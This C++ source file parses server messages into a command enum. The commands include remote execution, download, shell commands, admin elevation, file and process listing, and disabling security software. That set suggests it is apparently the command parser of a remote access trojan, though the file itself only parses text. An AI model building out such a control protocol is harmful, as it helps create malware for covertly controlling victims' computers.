#include<iostream>
#include <string>
#include <regex>
#include "ServerResponse.h"
#include "utils.h"

/*
id: <number>
action: <string>
content: <string>
*/

ServerResponse::ServerResponse(std::string data)
{
	std::regex Rid("^(id)\:(\s)*");
	std::regex Raction("^(action)\:(\s)*");
	std::regex Rcontent("^(content)\:(\s)*");

	for (std::string line : split(data, '\n'))
	{
		if (line != "")
		{
			if (line != std::regex_replace(line, Rid, ""))
			{
				
				std::string StrId = std::regex_replace(line, Rid, "");
				StrId.erase(remove(StrId.begin(), StrId.end(), ' '), StrId.end());
				this->id = std::atoi(StrId.c_str());
			}
			else if (line != std::regex_replace(line, Raction, ""))
			{
				std::string StrAction = std::regex_replace(line, Raction, "");
				StrAction.erase(remove(StrAction.begin(), StrAction.end(), ' '), StrAction.end());

				if (StrAction == "EXECUTE")
				{
					this->action = EXECUTE;
				}
				else if (StrAction == "DOWNLOAD")
				{
					this->action = DOWNLOAD;
				}
				else if (StrAction == "ADMIN")
				{
					this->action = ADMIN;
				}
				else if (StrAction == "FILE_LIST")
				{
					this->action = FILE_LIST;
				}
				else if (StrAction == "SEND")
				{
					this->action = SEND;
				}
				else if (StrAction == "SECURITY_LIST")
				{
					this->action = SECURITY_LIST;
				}
				else if (StrAction == "CMD")
				{
					this->action = CMD;
				}
				else if (StrAction == "SECURITY_DISABLE")
				{
					this->action = SECURITY_DISABLE;
				}
				else if (StrAction == "PROCESS_LIST")
				{
					this->action = PROCESS_LIST;
				}
				else if (StrAction == "CREATE_FILE")
				{
					this->action = CREATE_FILE;
				}
				else if (StrAction == "CREATE_DIR")
				{
					this->action = CREATE_DIR;
				}
				else if (StrAction == "GET_PATH")
				{
					this->action = GET_PATH;
				}
				else {
					this->action = NONE;
				}
			}
			else if (line != std::regex_replace(line, Rcontent, ""))
			{
				this->arg = std::regex_replace(line, Rcontent, "");
			}
		}
	}
}

ServerResponse::~ServerResponse()
{}